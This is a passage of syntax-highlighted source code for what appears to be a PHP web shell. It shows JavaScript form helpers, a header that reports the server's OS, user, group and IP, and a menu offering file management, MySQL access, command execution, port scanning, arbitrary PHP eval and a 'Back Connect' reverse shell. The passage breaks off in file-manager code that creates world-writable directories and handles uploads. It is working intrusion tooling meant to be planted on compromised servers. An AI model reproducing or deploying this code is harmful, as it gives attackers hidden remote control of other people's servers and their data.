<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">var</span> tofile;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   tofile = prompt(<span style="color: #8abeb7;">'Original file:'</span>+sname+<span style="color: #8abeb7;">'\nPlease input object file (fullpath</span><span style="color: #8abeb7; text-decoration: underline;">):'</span><span style="text-decoration: underline;">, </span><span style="color: #8abeb7; text-decoration: underline;">''</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">!</span>tofile) <span style="color: #b5bd68;">return</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'copyfile'</span>).tofile.value=tofile;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'copyfile'</span>).sname.value=sname;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'copyfile'</span>).submit();
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">rename</span>(<span style="color: #81a2be;">oldname</span>){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">var</span> newfilename;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   newfilename = prompt(<span style="color: #8abeb7;">'Former file name:'</span>+oldname+<span style="color: #8abeb7;">'\nPlease input new filenam</span><span style="color: #8abeb7; text-decoration: underline;">e:'</span><span style="text-decoration: underline;">, </span><span style="color: #8abeb7; text-decoration: underline;">''</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">!</span>newfilename) <span style="color: #b5bd68;">return</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'rename'</span>).newfilename.value=newfilename;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'rename'</span>).oldname.value=oldname;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'rename'</span>).submit();
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">dofile</span>(<span style="color: #81a2be;">doing</span>,<span style="color: #81a2be;">thefile</span>,<span style="color: #81a2be;">m</span>){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (m &amp;&amp; <span style="color: #81a2be;">!</span>confirm(m)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'filelist'</span>).doing.value=doing;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (thefile){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'filelist'</span>).thefile.value=thefile;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'filelist'</span>).submit();
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">createfile</span>(<span style="color: #81a2be;">nowpath</span>){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">var</span> filename;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   filename = prompt(<span style="color: #8abeb7;">'Please input the file name:'</span>, <span style="color: #8abeb7;">''</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">!</span>filename) <span style="color: #b5bd68;">return</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   opfile(<span style="color: #8abeb7;">'editfile'</span>,nowpath + filename,nowpath);
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">opfile</span>(<span style="color: #81a2be;">action</span>,<span style="color: #81a2be;">opfile</span>,<span style="color: #81a2be;">dir</span>){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'fileopform'</span>).action.value=action;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'fileopform'</span>).opfile.value=opfile;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'fileopform'</span>).dir.value=dir;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'fileopform'</span>).submit();
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">godir</span>(<span style="color: #81a2be;">dir</span>,<span style="color: #81a2be;">view_writable</span>){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (view_writable) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'godir'</span>).view_writable.value=view_writable;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'godir'</span>).dir.value=dir;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'godir'</span>).submit();
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">getsize</span>(<span style="color: #81a2be;">getdir</span>,<span style="color: #81a2be;">dir</span>){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'getsize'</span>).getdir.value=getdir;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'getsize'</span>).dir.value=dir;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'getsize'</span>).submit();
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">editrecord</span>(<span style="color: #81a2be;">action</span>, <span style="color: #81a2be;">base64</span>, <span style="color: #81a2be;">tablename</span>){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (action == <span style="color: #8abeb7;">'del'</span>) {<span style="color: #de935f; background-color: #373b41;">      </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">!</span>confirm(<span style="color: #8abeb7;">'Is or isn\'t deletion record?'</span>)) <span style="color: #b5bd68;">return</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'recordlist'</span>).doing.value=action;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'recordlist'</span>).base64.value=base64;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'recordlist'</span>).tablename.value=tablename;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'recordlist'</span>).submit();
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">moddbname</span>(<span style="color: #81a2be;">dbname</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #81a2be;">!</span>dbname) <span style="color: #b5bd68;">return</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'setdbname'</span>).dbname.value=dbname;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'setdbname'</span>).submit();
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">settable</span>(<span style="color: #81a2be;">tablename</span>,<span style="color: #81a2be;">doing</span>,<span style="color: #81a2be;">page</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #81a2be;">!</span>tablename) <span style="color: #b5bd68;">return</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (doing) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'settable'</span>).doing.value=doing;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (page) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'settable'</span>).page.value=page;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'settable'</span>).tablename.value=tablename;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'settable'</span>).submit();
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">s</span>(<span style="color: #81a2be;">action</span>,<span style="color: #81a2be;">nowpath</span>,<span style="color: #81a2be;">p1</span>,<span style="color: #81a2be;">p2</span>,<span style="color: #81a2be;">p3</span>,<span style="color: #81a2be;">p4</span>,<span style="color: #81a2be;">p5</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(action) $(<span style="color: #8abeb7;">'opform'</span>).action.value=action;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(nowpath) $(<span style="color: #8abeb7;">'opform'</span>).nowpath.value=nowpath;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(p1) $(<span style="color: #8abeb7;">'opform'</span>).p1.value=p1;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(p2) $(<span style="color: #8abeb7;">'opform'</span>).p2.value=p2;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(p3) $(<span style="color: #8abeb7;">'opform'</span>).p3.value=p3;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(p4) $(<span style="color: #8abeb7;">'opform'</span>).p4.value=p4;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(p5) $(<span style="color: #8abeb7;">'opform'</span>).p4.value=p5;
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">g</span>(<span style="color: #81a2be;">action</span>,<span style="color: #81a2be;">nowpath</span>,<span style="color: #81a2be;">p1</span>,<span style="color: #81a2be;">p2</span>,<span style="color: #81a2be;">p3</span>,<span style="color: #81a2be;">p4</span>,<span style="color: #81a2be;">p5</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #81a2be;">!</span>action) <span style="color: #b5bd68;">return</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   s(action,nowpath,p1,p2,p3,p4,p5);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'opform'</span>).submit();
}
&lt;/script&gt;
&lt;/head&gt;
&lt;body style=<span style="color: #8abeb7;">"margin:0;table-layout:fixed; word-break:break-all"</span>&gt;
<span style="color: #b294bb;">&lt;?php</span>
formhead(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'opform'</span>));
makehide(<span style="color: #8abeb7;">'action'</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">action</span>);
makehide(<span style="color: #8abeb7;">'nowpath'</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>);
makehide(<span style="color: #8abeb7;">'p1'</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">p1</span>);
makehide(<span style="color: #8abeb7;">'p2'</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">p2</span>);
makehide(<span style="color: #8abeb7;">'p3'</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">p3</span>);
makehide(<span style="color: #8abeb7;">'p4'</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">p4</span>);
makehide(<span style="color: #8abeb7;">'p5'</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">p5</span>);
formfoot();

<span style="color: #b5bd68;">if</span>(<span style="color: #81a2be;">!</span>function_exists(<span style="color: #8abeb7;">'posix_getegid'</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">user</span> = @get_current_user();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">uid</span> = <span style="color: #81a2be;">@getmyuid</span>();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">gid</span> = <span style="color: #81a2be;">@getmygid</span>();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">group</span> = <span style="color: #8abeb7;">"?"</span>;
} <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">uid</span> = @posix_getpwuid(@posix_geteuid());
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">gid</span> = @posix_getgrgid(@posix_getegid());
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">user</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">uid</span>[<span style="color: #8abeb7;">'name'</span>];
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">uid</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">uid</span>[<span style="color: #8abeb7;">'uid'</span>];
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">group</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">gid</span>[<span style="color: #8abeb7;">'name'</span>];
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">gid</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">gid</span>[<span style="color: #8abeb7;">'gid'</span>];
}

<span style="color: #b294bb;">?&gt;</span>
&lt;table width=<span style="color: #8abeb7;">"100%"</span> border=<span style="color: #8abeb7;">"0"</span> cellpadding=<span style="color: #8abeb7;">"0"</span> cellspacing=<span style="color: #8abeb7;">"0"</span>&gt;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;tr <span style="color: #b5bd68;">class</span>=<span style="color: #8abeb7;">"head"</span>&gt;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;td&gt;&lt;span style=<span style="color: #8abeb7;">"float:right;"</span>&gt;<span style="color: #b294bb;">&lt;?</span>php <span style="color: #b5bd68;">echo</span> @php_uname();<span style="color: #b294bb;">?&gt;</span> / User:<span style="color: #b294bb;">&lt;?</span>php <span style="color: #b5bd68;">e</span><span style="color: #b5bd68; text-decoration: underline;">cho</span><span style="text-decoration: underline;"> </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">uid</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">' ( '</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">user</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">' ) / Group: '</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">gid</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">' ( '</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">group</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">' )'</span><span style="text-decoration: underline;">;</span><span style="color: #b294bb; text-decoration: underline;">?&gt;</span><span style="text-decoration: underline;">&lt;/span&gt;</span><span style="color: #b294bb; text-decoration: underline;">&lt;?</span><span style="text-decoration: underline;">php </span><span style="color: #b5bd68; text-decoration: underline;">echo</span><span style="text-decoration: underline;"> </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">_SERVER</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'HTTP_HOST'</span><span style="text-decoration: underline;">];</span><span style="color: #b294bb; text-decoration: underline;">?&gt;</span><span style="text-decoration: underline;"> (</span><span style="color: #b294bb; text-decoration: underline;">&lt;?</span><span style="text-decoration: underline;">php </span><span style="color: #b5bd68; text-decoration: underline;">echo</span><span style="text-decoration: underline;"> gethostbyname(</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">_SERVER</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'SERVER_NAME'</span><span style="text-decoration: underline;">]);</span><span style="color: #b294bb; text-decoration: underline;">?&gt;</span><span style="text-decoration: underline;">)&lt;/td&gt;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;/tr&gt;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;tr <span style="color: #b5bd68;">class</span>=<span style="color: #8abeb7;">"alt1"</span>&gt;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;td&gt;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;span style=<span style="color: #8abeb7;">"float:right;"</span>&gt;<span style="color: #81a2be;">PHP</span> <span style="color: #b294bb;">&lt;?</span>php <span style="color: #b5bd68;">echo</span> <span style="color: #81a2be;">PHP_VERSION</span>;<span style="color: #b294bb;">?&gt;</span> / Safe Mode<span style="text-decoration: underline;">:</span><span style="color: #b294bb; text-decoration: underline;">&lt;?</span><span style="text-decoration: underline;">php </span><span style="color: #b5bd68; text-decoration: underline;">echo</span><span style="text-decoration: underline;"> getcfg(</span><span style="color: #8abeb7; text-decoration: underline;">'safe_mode'</span><span style="text-decoration: underline;">);</span><span style="color: #b294bb; text-decoration: underline;">?&gt;</span><span style="text-decoration: underline;">&lt;/span&gt;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;a href=<span style="color: #8abeb7;">"javascript:g('logout');"</span>&gt;Logout&lt;/a&gt; |<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;a href=<span style="color: #8abeb7;">"javascript:g('file');"</span>&gt;File Manager&lt;/a&gt; |<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;a href=<span style="color: #8abeb7;">"javascript:g('mysqladmin');"</span>&gt;<span style="color: #81a2be;">MYSQL</span> Manager&lt;/a&gt; |<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;a href=<span style="color: #8abeb7;">"javascript:g('sqlfile');"</span>&gt;MySQL Upload &amp;amp; Download&lt;/a&gt; |<span style="color: #de935f; background-color: #373b41; text-decoration: underline;"> </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;a href=<span style="color: #8abeb7;">"javascript:g('shell');"</span>&gt;Execute Command&lt;/a&gt; |<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;a href=<span style="color: #8abeb7;">"javascript:g('phpenv');"</span>&gt;<span style="color: #81a2be;">PHP</span> Variable&lt;/a&gt; |<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;a href=<span style="color: #8abeb7;">"javascript:g('portscan');"</span>&gt;Port Scan&lt;/a&gt; |<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;a href=<span style="color: #8abeb7;">"javascript:g('secinfo');"</span>&gt;Security information&lt;/a&gt; |<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;a href=<span style="color: #8abeb7;">"javascript:g('eval');"</span>&gt;Eval <span style="color: #81a2be;">PHP</span> Code&lt;/a&gt;
<span style="color: #c5c8c6; background-color: #373b41;"> </span><span style="color: #b294bb;">   </span><span style="color: #c5c8c6; background-color: #373b41;"> </span><span style="color: #b294bb;">   </span><span style="color: #c5c8c6; background-color: #373b41;"> </span><span style="color: #b294bb;">   &lt;?php</span> <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">!</span><span style="color: #81a2be;">IS_WIN</span>) {<span style="color: #b294bb;">?&gt;</span> | &lt;a href=<span style="color: #8abeb7;">"javascript:g('backconnect');"</span>&gt;Back<span style="text-decoration: underline;"> Connect&lt;/a&gt;</span><span style="color: #b294bb; text-decoration: underline;">&lt;?</span><span style="text-decoration: underline;">php }</span><span style="color: #b294bb; text-decoration: underline;">?&gt;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;/td&gt;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;/tr&gt;
&lt;/table&gt;
&lt;table width=<span style="color: #8abeb7;">"100%"</span> border=<span style="color: #8abeb7;">"0"</span> cellpadding=<span style="color: #8abeb7;">"15"</span> cellspacing=<span style="color: #8abeb7;">"0"</span>&gt;&lt;tr&gt;&lt;td&gt;
<span style="color: #b294bb;">&lt;?php</span>
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">errmsg</span> &amp;&amp; m(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">errmsg</span>);

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#33719;&#21462;&#24403;&#21069;&#36335;&#24452;</span>
<span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dir</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dir</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">"DOCUMENT_ROOT"</span>] ? <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">"DOCUMENT_ROOT"</span>] : <span style="color: #8abeb7;">'.'</span>;
}
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span> = getPath(<span style="color: #81a2be;">SA_ROOT</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dir</span>);
<span style="color: #b5bd68;">if</span> (substr(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dir</span>, -1) != <span style="color: #8abeb7;">'/'</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dir</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dir</span>.<span style="color: #8abeb7;">'/'</span>;
}

<span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">action</span> == <span style="color: #8abeb7;">'file'</span>) {

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#21028;&#26029;&#35835;&#20889;&#24773;&#20917;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dir_writeable</span> = @is_writable(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>) ? <span style="color: #8abeb7;">'Writable'</span> : <span style="color: #8abeb7;">'Non-writable'</span>;

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#21019;&#24314;&#30446;&#24405;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">newdirname</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mkdirs</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">newdirname</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (file_exists(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mkdirs</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   m(<span style="color: #8abeb7;">'Directory has already existed'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   m(<span style="color: #8abeb7;">'Directory created '</span>.(<span style="color: #81a2be;">@mkdir</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mkdirs</span>,0777) ? <span style="color: #8abeb7;">'success'</span> : <span style="color: #8abeb7;">'failed'</span>)<span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">@chmod</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mkdirs</span>,0777);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#19978;&#20256;&#25991;&#20214;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">elseif</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">doupfile</span>) {
